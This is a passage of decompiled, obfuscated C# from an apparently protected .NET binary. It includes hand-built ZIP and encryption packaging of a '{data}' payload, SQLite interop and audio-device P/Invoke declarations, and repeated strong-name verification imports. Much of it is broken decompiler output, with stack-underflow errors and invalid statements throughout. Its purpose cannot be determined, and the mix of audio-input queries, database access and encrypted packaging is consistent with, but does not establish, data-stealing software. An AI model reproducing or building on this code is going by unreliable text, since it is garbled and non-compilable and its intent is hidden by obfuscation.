						752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
						2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
						1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
						2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
						1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
						3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
						1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
					};
					uint num2 = uint.MaxValue;
					uint num3 = num2;
					int num4 = 0;
					int num5 = _0003.Length;
					while (--num5 >= 0)
					{
						num3 = array[(num3 ^ _0003[num4++]) & 0xFF] ^ (num3 >> 8);
					}
					num3 ^= num2;
					_0018._0001(67324752, obj);
					_0018._0001(20, obj);
					_0018._0001(0, obj);
					_0018._0001(8, obj);
					_0018._0001((int)num, obj);
					_0018._0001((int)num3, obj);
					long position = obj.Position;
					_0018._0001(0, obj);
					_0018._0001(_0003.Length, obj);
					byte[] bytes = Encoding.UTF8.GetBytes("{data}");
					_0018._0001(bytes.Length, obj);
					_0018._0001(0, obj);
					obj.Write(bytes, 0, bytes.Length);
					_0018._0001(obj2, _0003);
					while (!obj2.IsNeedingInput)
					{
						byte[] array2 = new byte[512];
						int num6 = _0018._0001(array2, obj2);
						if (num6 <= 0)
						{
							break;
						}
						obj.Write(array2, 0, num6);
					}
					_0018._0001(obj2);
					while (!obj2.IsFinished)
					{
						byte[] array3 = new byte[512];
						int num7 = _0018._0001(array3, obj2);
						if (num7 <= 0)
						{
							break;
						}
						obj.Write(array3, 0, num7);
					}
					long num8 = obj2._0001;
					_0018._0001(33639248, obj);
					_0018._0001(20, obj);
					_0018._0001(20, obj);
					_0018._0001(0, obj);
					_0018._0001(8, obj);
					_0018._0001((int)num, obj);
					_0018._0001((int)num3, obj);
					_0018._0001((int)num8, obj);
					_0018._0001(_0003.Length, obj);
					_0018._0001(bytes.Length, obj);
					_0018._0001(0, obj);
					_0018._0001(0, obj);
					_0018._0001(0, obj);
					_0018._0001(0, obj);
					_0018._0001(0, obj);
					_0018._0001(0, obj);
					obj.Write(bytes, 0, bytes.Length);
					_0018._0001(101010256, obj);
					_0018._0001(0, obj);
					_0018._0001(0, obj);
					_0018._0001(1, obj);
					_0018._0001(1, obj);
					_0018._0001(46 + bytes.Length, obj);
					_0018._0001((int)(30 + bytes.Length + num8), obj);
					_0018._0001(0, obj);
					obj.Seek(position, SeekOrigin.Begin);
					_0018._0001((int)num8, obj);
				}
				else
				{
					switch (_0002)
					{
					case 1:
					{
						_0018._0001(25000571, obj);
						_0018._0001(_0003.Length, obj);
						byte[] array8;
						for (int i = 0; i < _0003.Length; i += array8.Length)
						{
							array8 = new byte[Math.Min(2097151, _0003.Length - i)];
							Buffer.BlockCopy(_0003, i, array8, 0, array8.Length);
							long position2 = obj.Position;
							_0018._0001(0, obj);
							_0018._0001(array8.Length, obj);
							global::_0017._007F._0006 obj3 = new global::_0017._007F._0006();
							_0018._0001(obj3, array8);
							while (!obj3.IsNeedingInput)
							{
								byte[] array9 = new byte[512];
								int num9 = _0018._0001(array9, obj3);
								if (num9 <= 0)
								{
									break;
								}
								obj.Write(array9, 0, num9);
							}
							_0018._0001(obj3);
							while (!obj3.IsFinished)
							{
								byte[] array10 = new byte[512];
								int num10 = _0018._0001(array10, obj3);
								if (num10 <= 0)
								{
									break;
								}
								obj.Write(array10, 0, num10);
							}
							long position3 = obj.Position;
							obj.Position = position2;
							_0018._0001((int)obj3._0001, obj);
							obj.Position = position3;
						}
						break;
					}
					case 2:
					{
						_0018._0001(41777787, obj);
						byte[] array6 = _0018._0001(1, _0003, (byte[])null, (byte[])null);
						using (ICryptoTransform cryptoTransform2 = _0018._0001(_0004, _0003: false, _0005))
						{
							byte[] array7 = cryptoTransform2.TransformFinalBlock(array6, 0, array6.Length);
							obj.Write(array7, 0, array7.Length);
						}
						break;
					}
					case 3:
					{
						_0018._0001(58555003, obj);
						byte[] array4 = _0018._0001(1, _0003, (byte[])null, (byte[])null);
						using (ICryptoTransform cryptoTransform = _0018._0001(_0002: false, _0005, _0004))
						{
							byte[] array5 = cryptoTransform.TransformFinalBlock(array4, 0, array4.Length);
							obj.Write(array5, 0, array5.Length);
						}
						break;
					}
					}
				}
				obj.Flush();
				obj.Close();
				return obj.ToArray();
			}
			catch (Exception ex)
			{
				global::_0017._007F._0001 = "ERR 2003: " + ex.Message;
				throw;
			}
		}

		static DateTime _0001(double _0002, DateTimeKind _0003)
		{
			//IL_0060: Incompatible stack heights: 0 vs 1
			//IL_0067: Incompatible stack heights: 0 vs 1
			_0018._0001((double)/*Error near IL_0067: Stack underflow*/);
			long num = (long)/*Error near IL_006a: Stack underflow*/;
			DateTime dateTime = _0018._0001(num, (DateTime?)null);
			DateTime? dateTime2 = default(DateTime?);
			DateTime? dateTime3 = dateTime2;
			dateTime2 = null;
			DateTime dateTime4 = _0018._0001(dateTime3, num);
			return new DateTime(dateTime.Year, dateTime.Month, dateTime.Day, dateTime4.Hour, dateTime4.Minute, dateTime4.Second, dateTime4.Millisecond, _0003);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static short _0001(byte _0002)
		{
			//IL_000a: Incompatible stack heights: 0 vs 2
			_ = _001A._0014._0001;
			return ((short[])/*Error near IL_0008: Stack underflow*/)[/*Error near IL_0008: Stack underflow*/];
		}

		static bool _0001(global::_0002._0019 P_0)
		{
			//IL_0005: Invalid comparison between Unknown and I4
			//IL_0009: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0002._0019)/*Error near IL_0010: Stack underflow*/);
			return (int)/*Error near IL_0007: Stack underflow*/ > 0;
		}

		[DllImport("winmm.dll", CharSet = CharSet.Auto, EntryPoint = "waveInGetDevCaps")]
		static extern MmResult _0001(IntPtr _0002, out _0019._0004 _0003, int _0004);

		static int _0001(Guid _0002, int _0003 = -1, MediaType P_2)
		{
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 1
			int result = (int)/*Error near IL_004d: Stack underflow*/;
			try
			{
				((MediaType)/*Error near IL_000b: Stack underflow*/)._0001._0002(_0002, out result);
				return result;
			}
			catch (COMException ex)
			{
				if (ex._0001() != -1072875802)
				{
					if (ex._0001() == -1072875843)
					{
						throw new ArgumentException(_0080._0014._0001(107348549));
					}
					throw;
				}
				return result;
			}
		}

		static int _0001(int _0002, global::_000E._0008 P_1)
		{
			//IL_00ef: Incompatible stack heights: 0 vs 1
			//IL_00fb: Incompatible stack heights: 0 vs 1
			int num = (int)/*Error near IL_00f5: Stack underflow*/;
			if (_0018._0001((global::_000E._0008)/*Error near IL_0014: Stack underflow*/))
			{
				P_1._0002._0003();
			}
			if (P_1._0001 == _001C._0005._0003)
			{
				_0007_0003._0086_0006(P_1._0001, 0, P_1._0001.Length);
			}
			else
			{
				num = P_1._0001.Read(P_1._0001, 0, _0002);
				if (num == 0)
				{
					_0007_0003._0086_0006(P_1._0001, 0, P_1._0001.Length);
					return 0;
				}
			}
			P_1._0002._0001(P_1._0003, (uint)num, out var intPtr, out var num2, out var intPtr2, out var num3, global::_000E._0008._0005._0001);
			if (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
			{
				_0088_0005._0017_000F(P_1._0001, 0, intPtr, num2);
				if (_0090_0002._0099_0005(intPtr2, IntPtr.Zero))
				{
					_0088_0005._0017_000F(P_1._0001, 0, intPtr, num2);
				}
			}
			P_1._0002._0001(intPtr, num2, intPtr2, num3);
			return num;
		}

		unsafe static IntPtr _0001(out long _0002, [Out] global::_0015._0012 _0003, out global::_000F._000F _0004, out long _0005, ref int P_4)
		{
			//IL_0021: Incompatible stack heights: 0 vs 2
			//IL_0025: Incompatible stack heights: 0 vs 3
			//IL_0028: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((global::_0015._0012)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr result = default(IntPtr);
			_ = ref result;
			int num = ((global::_0012._0010)/*Error near IL_0019: Stack underflow*/)._0001(out *(IntPtr*)/*Error near IL_0019: Stack underflow*/, out *(int*)/*Error near IL_0019: Stack underflow*/, out *(global::_000F._000F*)/*Error near IL_0019: Stack underflow*/, out _0005, out _0002);
			/*Error near IL_001e: Stack underflow*/(num);
			return result;
		}

		unsafe static byte[] _0001(ref string _0002, string _0003)
		{
			//IL_00af: Incompatible stack heights: 0 vs 1
			//IL_00b5: Incompatible stack heights: 0 vs 1
			//IL_00bf: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
			{
				_0080._0014._0001(107348516);
				*(_003F*)(nint)/*Error near IL_0017: Stack underflow*/ = /*Error near IL_0017: Stack underflow*/;
				return null;
			}
			if (global::_001A._007E_0016_0003(_0003) % 2 != 0)
			{
				_0002 = _0080._0014._0001(107348495);
				return null;
			}
			byte[] array = new byte[global::_001A._007E_0016_0003(_0003) / 2];
			for (int i = 0; i < global::_001A._007E_0016_0003(_0003); i += 2)
			{
				string text = _0087_0002._007E_008F_0005(_0003, i, 2);
				if (!_0018._0001(ref array[i / 2], NumberStyles.HexNumber, text))
				{
					_0002 = _0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107348978), new object[1] { text });
					return null;
				}
			}
			return array;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_memory_highwater")]
		static extern long _0001(int _0002);

		static int _0001(global::_0017._007F._000F P_0)
		{
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Expected I4, but got Unknown
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._007F._000F)/*Error near IL_0018: Stack underflow*/);
			int num = _0018._0001((global::_0017._007F._000F)/*Error near IL_000b: Stack underflow*/);
			return /*Error near IL_000f: Stack underflow*/| (num << 16);
		}

		static int _0001(byte[] _0002, int _0003, global::_0017._0019 _0004, int P_3)
		{
			//IL_0058: Incompatible stack heights: 0 vs 2
			//IL_005b: Incompatible stack heights: 0 vs 1
			//IL_0062: Incompatible stack heights: 0 vs 1
			_ = _0016_0002._0018_0005;
			int num = ((global::_0017._0019)/*Error near IL_000e: Stack underflow*/)._0002;
			/*Error near IL_0062: Stack underflow*/((int)/*Error near IL_0062: Stack underflow*/, num);
			int num2 = (int)/*Error near IL_0011: Stack underflow*/;
			_0099_0002._0010_0006(_0004._0002, _0004._0001, _0002, P_3, num2);
			_0004._0001 += num2;
			_0004._0002 -= num2;
			if (_0004._0002 == 0)
			{
				_0004._0001 = 0;
			}
			return num2;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_declare_vtab")]
		static extern _0080._0017 _0001(IntPtr _0002, IntPtr _0003);

		static int _0001(int _0002, global::_0017._007F._0007 P_1)
		{
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Expected I4, but got Unknown
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0009: Stack underflow*/ == 255)
			{
				return 285;
			}
			int num = 257;
			while (_0002 >= 8)
			{
				num = /*Error near IL_001c: Stack underflow*/+ 4;
				_0002 >>= 1;
			}
			return num + _0002;
		}

		static string _0001()
		{
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107348889);
			_0018._0001((string)/*Error near IL_0028: Stack underflow*/, (string)null);
			string text = (string)/*Error near IL_002b: Stack underflow*/;
			if (text != null)
			{
				return text;
			}
			return _0080._0014._0001(107348812);
		}

		static void _0001(global::_0017._001B P_0)
		{
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 1
			if (((global::_0017._001B)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				((global::_0017._001B)/*Error near IL_0011: Stack underflow*/)._0001 = null;
			}
			if (((global::_0017._001B)/*Error near IL_0018: Stack underflow*/)._0001 != null)
			{
				global::_0007._0097(P_0._0001._0002(P_0._0001));
			}
		}

		static void _0001(int _0002, global::_0017._007F._0003 _0003, byte[] _0004, int P_3)
		{
			//IL_0014: Invalid comparison between Unknown and I4
			//IL_0046: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0050: Incompatible stack heights: 0 vs 1
			if (((global::_0017._007F._0003)/*Error near IL_0007: Stack underflow*/)._0004 > 0)
			{
				new InvalidOperationException();
				throw /*Error near IL_000d: Stack underflow*/;
			}
			if ((int)/*Error near IL_0016: Stack underflow*/ > 32768)
			{
				_0002 += P_3 - 32768;
				P_3 = 32768;
			}
			Array.Copy(_0004, _0002, _0003._0001, 0, P_3);
			_0003._0003 = P_3 & 0x7FFF;
		}

		static void _0001(int _0002, byte[] _0003, int _0004, global::_0017._007F._0002 P_3)
		{
			//IL_0011: Invalid comparison between Unknown and I4
			//IL_007d: Incompatible stack heights: 0 vs 1
			//IL_0083: Incompatible stack heights: 0 vs 2
			//IL_008d: Incompatible stack heights: 0 vs 1
			_ = ((global::_0017._007F._0002)/*Error near IL_0007: Stack underflow*/)._0001;
			int num = ((global::_0017._007F._0002)/*Error near IL_0011: Stack underflow*/)._0002;
			if ((int)/*Error near IL_0013: Stack underflow*/ < num)
			{
				new InvalidOperationException();
				throw /*Error near IL_0016: Stack underflow*/;
			}
			int num2 = _0002 + _0004;
			if (0 > _0002 || _0002 > num2 || num2 > _0003.Length)
			{
				throw new ArgumentOutOfRangeException();
			}
			if (((uint)_0004 & (true ? 1u : 0u)) != 0)
			{
				P_3._0001 |= (uint)((_0003[_0002++] & 0xFF) << P_3._0003);
				P_3._0003 += 8;
			}
			P_3._0001 = _0003;
			P_3._0001 = _0002;
			P_3._0002 = num2;
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "interop_compileoption_used")]
		static extern int _0001(IntPtr _0002);

		static string _0001(Guid _0002)
		{
			//IL_0047: Incompatible stack heights: 0 vs 2
			//IL_004a: Incompatible stack heights: 0 vs 2
			for (int i = 0; i < _0001._0001.Length; i++)
			{
				_ = _0094_0002._0004_0006;
				_ = _0001._0001;
				Guid guid = ((Guid[])/*Error near IL_0018: Stack underflow*/)[/*Error near IL_0018: Stack underflow*/];
				if (/*Error near IL_001d: Stack underflow*/((Guid)/*Error near IL_001d: Stack underflow*/, guid))
				{
					return _0001._0001[i];
				}
			}
			return _0002.ToString();
		}

		[DllImport("Msacm32.dll", EntryPoint = "acmDriverDetails")]
		static extern MmResult _0001(IntPtr _0002, ref global::_0010._0008 _0003, int _0004);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_backup_step")]
		static extern _0080._0017 _0001(IntPtr _0002, int _0003);

		[DllImport("Msacm32.dll", EntryPoint = "acmFormatTagEnum")]
		static extern MmResult _0001(IntPtr _0002, ref _001F._000E _0003, global::_0008._0008._0003 _0004, IntPtr _0005, int _0006);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static bool _0001(string _0002, string _0003, ref string _0004, ref IntPtr _0005)
		{
			//IL_0156: Incompatible stack heights: 0 vs 1
			//IL_0160: Incompatible stack heights: 0 vs 1
			//IL_0166: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
			{
				_0018._0001();
				_0003 = (string)/*Error near IL_000e: Stack underflow*/;
			}
			if ((int)/*Error near IL_0015: Stack underflow*/ == 0)
			{
				return false;
			}
			string text = _0018._0001();
			if (text == null)
			{
				return false;
			}
			string text2 = _0018._0001(_0018._0001(_0003, text));
			if (global::_001C._0097_0003(text2))
			{
				return false;
			}
			if (_0002 == null)
			{
				_0002 = _0018._0001();
			}
			if (_0002 == null)
			{
				return false;
			}
			text2 = _0018._0001(_0018._0001(_0018._0001(_0003, _0002), text));
			if (!global::_001C._0097_0003(text2))
			{
				string text3 = _0018._0001(_0002);
				if (text3 == null)
				{
					return false;
				}
				text2 = _0018._0001(_0018._0001(_0018._0001(_0003, text3), text));
				if (!global::_001C._0097_0003(text2))
				{
					return false;
				}
			}
			try
			{
				try
				{
					_0015_0004._001E_0008(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107348819), new object[1] { text2 }));
				}
				catch
				{
				}
				_0004 = text2;
				_0005 = _0018._0001(text2);
				return _0090_0002._0099_0005(_0005, IntPtr.Zero);
			}
			catch (Exception ex)
			{
				try
				{
					int num = _001B_0003._0099_0006();
					_0015_0004._001E_0008(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107348174), new object[3] { text2, num, ex }));
				}
				catch
				{
				}
			}
			return false;
		}

		static int _0001(string _0002, string _0003, _001F._0019 P_2)
		{
			//IL_007e: Incompatible stack heights: 0 vs 1
			//IL_0084: Incompatible stack heights: 0 vs 1
			//IL_008a: Incompatible stack heights: 0 vs 1
			if (((_001F._0019)/*Error near IL_0007: Stack underflow*/)._0001 != null && (int)/*Error near IL_0013: Stack underflow*/ != 0 && (int)/*Error near IL_001a: Stack underflow*/ != 0)
			{
				for (int i = 0; i < P_2._0001.Length; i++)
				{
					if (_0010_0003._008B_0006(P_2._0001[i]._0001, _0002) && _0010_0003._008B_0006(P_2._0001[i]._0002, _0003))
					{
						return P_2._0001[i]._0001;
					}
				}
			}
			return -1;
		}

		[DllImport("winmm.dll", CharSet = CharSet.Auto, EntryPoint = "waveOutGetDevCaps")]
		static extern MmResult _0001(IntPtr _0002, out _001F._0005 _0003, int _0004);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(_001F._001A P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((_001F._001A)/*Error near IL_0007: Stack underflow*/)._0002)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(_001F._001A).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static void _0001(string _0002, global::_0008._0001 P_1)
		{
			//IL_0074: Incompatible stack heights: 0 vs 2
			//IL_007b: Incompatible stack heights: 0 vs 1
			try
			{
				_ = global::_001C._0097_0003;
				/*Error near IL_007b: Stack underflow*/((string)/*Error near IL_007b: Stack underflow*/);
				if (/*Error near IL_000d: Stack underflow*/)
				{
					_0018._0001(P_1, _0015_0005._009D_000E(_0002), _0084._000F_0004(global::_000E._008A_0002(_0080._0014._0001(107348044), new char[1] { '!' })[0], _0002, _0080._0014._0001(107348011), global::_0002._007E_0006(global::_001E._009D_0003(_0002))), true);
				}
			}
			catch
			{
			}
		}

		static bool _0001(global::_0005._0005 _0002)
		{
			//IL_0053: Incompatible stack heights: 0 vs 1
			//IL_0059: Incompatible stack heights: 0 vs 1
			global::_0002._0005 obj = /*Error near IL_0003: Stack underflow*/as global::_0002._0005;
			if (((global::_0005._0005)/*Error near IL_0010: Stack underflow*/)._0001 != WaveFormatEncoding.Pcm && _0002._0001 != WaveFormatEncoding.IeeeFloat)
			{
				if (obj != null)
				{
					if (!_0094_0002._0004_0006(obj._0001, _001F._0011._000F))
					{
						return _0094_0002._0004_0006(obj._0001, _001F._0011._0006);
					}
					return true;
				}
				return false;
			}
			return true;
		}

		[DllImport("winmm.dll", EntryPoint = "midiOutCachePatches")]
		static extern MmResult _0001(IntPtr _0002, int _0003, IntPtr _0004, int _0005);

		static void _0001(string _0002, object _0003)
		{
			//IL_0015: Incompatible stack heights: 0 vs 2
			//IL_0018: Incompatible stack heights: 0 vs 1
			if (global::_0017._0080._0001 != null)
			{
				_ = global::_0017._0080._0001;
				_0018._0001((global::_0017._0080)/*Error near IL_001f: Stack underflow*/, (string)/*Error near IL_001f: Stack underflow*/, (object)/*Error near IL_001f: Stack underflow*/);
			}
		}

		static string _0001(string _0002)
		{
			//IL_0071: Incompatible stack heights: 0 vs 2
			//IL_007b: Incompatible stack heights: 0 vs 1
			//IL_0081: Incompatible stack heights: 0 vs 1
			_ = global::_001C._0096_0003;
			/*Error near IL_007b: Stack underflow*/((string)/*Error near IL_007b: Stack underflow*/);
			if ((int)/*Error near IL_000b: Stack underflow*/ != 0)
			{
				return (string)/*Error near IL_000e: Stack underflow*/;
			}
			int num = global::_001A._007E_0016_0003(_0002);
			if ((_009F_0004._007E_0088_000E(_0002, 0) == '\'' && _009F_0004._007E_0088_000E(_0002, num - 1) == '\'') || (_009F_0004._007E_0088_000E(_0002, 0) == '"' && _009F_0004._007E_0088_000E(_0002, num - 1) == '"'))
			{
				return _0087_0002._007E_008F_0005(_0002, 1, num - 2);
			}
			return _0002;
		}

		static void _0001(BinaryReader _0002, _001E._0010 P_1)
		{
			//IL_004a: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0054: Incompatible stack heights: 0 vs 1
			_0018._0001((BinaryReader)/*Error near IL_0054: Stack underflow*/);
			((_001E._0010)/*Error near IL_000b: Stack underflow*/)._0003 = (_001F._0013)/*Error near IL_000b: Stack underflow*/;
			char[] array = _0098_0005._007E_008A_000F(_0002, 34);
			int i;
			for (i = 0; i < array.Length && array[i] != 0; i++)
			{
			}
			P_1._0001 = new string(array, 0, i);
			_0083_0002._007E_008C_0005(_0002, 98);
		}

		static void _0001(_0080._0017 _0002, global::_0001._007F P_1)
		{
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((global::_0001._007F)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_002d: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				new InvalidOperationException();
				throw /*Error near IL_0018: Stack underflow*/;
			}
			_0018._0001(P_1._0001, _0002);
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_column_database_name_interop")]
		static extern IntPtr _0001(IntPtr _0002, int _0003, ref int _0004);

		unsafe static void _0001(int _0002, int _0003, global::_0015._000E _0004, byte[] _0005, byte[] P_4)
		{
			//IL_00a1: Incompatible stack heights: 0 vs 1
			//IL_00a7: Incompatible stack heights: 0 vs 1
			fixed (byte* ptr = &((byte[])/*Error near IL_000b: Stack underflow*/)[/*Error near IL_000b: Stack underflow*/])
			{
				fixed (byte* ptr3 = &P_4[0])
				{
					short* ptr2 = (short*)ptr;
					float* ptr4 = (float*)ptr3;
					int num = _0002 / 4;
					for (int i = 0; i < num; i++)
					{
						float num2 = ptr4[i] * _0004._0001;
						if (num2 > 1f)
						{
							ptr2[i] = short.MaxValue;
							_0004._0001 = true;
						}
						else if (num2 < -1f)
						{
							ptr2[i] = short.MinValue;
							_0004._0001 = true;
						}
						else
						{
							ptr2[i] = (short)(num2 * 32767f);
						}
					}
				}
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_malloc")]
		static extern IntPtr _0001(int _0002);

		static void _0001(global::_000F._0006 _0002, double P_1)
		{
			//IL_0057: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 2
			object obj = ((global::_000F._0006)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
			try
			{
				_0002._0001 = 0;
				_0002._0002 = (int)(P_1 * (double)_0002._0001.WaveFormat._0001 / 1000.0);
				_0002._0001 = global::_000F._0006._0001._0002;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		static string _0001(global::_0016._001D P_0)
		{
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 2
			//IL_003c: Incompatible stack heights: 0 vs 1
			int num = ((global::_0003._0016)/*Error near IL_0007: Stack underflow*/)._0001._0012 + 1;
			((global::_0017._0080)/*Error near IL_0017: Stack underflow*/)._0012 = (int)/*Error near IL_0017: Stack underflow*/;
			int num2 = (int)/*Error near IL_001a: Stack underflow*/;
			return _0008_0002._0007_0005(_0080._0014._0001(107348006), num2);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static double _0001(long _0002)
		{
			//IL_0010: Incompatible stack heights: 0 vs 1
			return (double)/*Error near IL_0003: Stack underflow*/ / 86400000.0;
		}

		static void _0001(_001D._0010 P_0)
		{
			//IL_0098: Incompatible stack heights: 0 vs 1
			//IL_009e: Incompatible stack heights: 0 vs 3
			//IL_00a8: Incompatible stack heights: 0 vs 1
			_ = ((_001D._0010)/*Error near IL_000a: Stack underflow*/)._0001;
			_ = _0098._0089_0004;
			global::_0013._000E obj = ((_001D._0010)/*Error near IL_0019: Stack underflow*/)._0001;
			/*Error near IL_00a8: Stack underflow*/(obj);
			((global::_0013._000E)/*Error near IL_0023: Stack underflow*/)._0001 = (int)/*Error near IL_0023: Stack underflow*/;
			P_0._0001._0002 = P_0._0001.Length;
			P_0._0001._0002 = P_0._0001.AddrOfPinnedObject();
			P_0._0001._0004 = P_0._0002.Length;
			P_0._0001._0004 = P_0._0002.AddrOfPinnedObject();
			_0018._0001(_0018._0001(P_0._0001, P_0._0001, 0), _0080._0014._0001(107347969));
		}

		static void _0001(global::_000E._001B _0002, _0080._0011 P_1)
		{
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			global::_0017._001A obj = ((_0080._0011)/*Error near IL_0007: Stack underflow*/)._0001;
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0)
			{
				obj(_0002);
			}
		}

		static void _0001()
		{
			//IL_0049: Incompatible stack heights: 0 vs 2
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_0057: Incompatible stack heights: 0 vs 2
			_ = global::_0002._007E_0006;
			_0080._0014._0001(107348448);
			/*Error near IL_0050: Stack underflow*/((object)/*Error near IL_0050: Stack underflow*/);
			global::_0015._0001._0011 = (string)/*Error near IL_0014: Stack underflow*/;
			_ = global::_0002._007E_0006;
			_008F._001E_0004();
			global::_0015._0001._0012 = /*Error near IL_0025: Stack underflow*/((object)/*Error near IL_0025: Stack underflow*/);
			global::_0015._0001._0013 = global::_0002._007E_0006(_008F._001F_0004());
		}

		static global::_0010._001C _0001(_001D._0019 P_0)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 2
			_0018._0001((_001D._0019)/*Error near IL_001e: Stack underflow*/);
			_ = _008D_0004._000F_000E;
			return (global::_0010._001C)/*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
		}

		static void _0001(object _0002, EventArgs _0003)
		{
			//IL_00b3: Incompatible stack heights: 0 vs 2
			_ = _0091_0002._009C_0005;
			object obj = global::_0015._0016._0001;
			/*Error near IL_00bd: Stack underflow*/((object)/*Error near IL_00bd: Stack underflow*/);
			try
			{
				_0018._0001();
				global::_0015._0016._0001 = false;
				if (global::_0015._0016._0001 != null)
				{
					_0080._0017 obj2 = global::_0015._0016._0001._0002();
					if (obj2 != 0)
					{
						throw new SQLiteException(obj2, _0080._0014._0001(107348431));
					}
					obj2 = global::_0015._0016._0001._0001((global::_0015._0015)null);
					if (obj2 != 0)
					{
						throw new SQLiteException(obj2, _0080._0014._0001(107348390));
					}
				}
				if (global::_0015._0016._0001 != null)
				{
					global::_0015._0016._0001 = null;
				}
				if (global::_0015._0016._0001 != null)
				{
					_0097_0005._007E_0089_000F(_0097_0004._001F_000E(), global::_0015._0016._0001);
					global::_0015._0016._0001 = null;
				}
			}
			finally
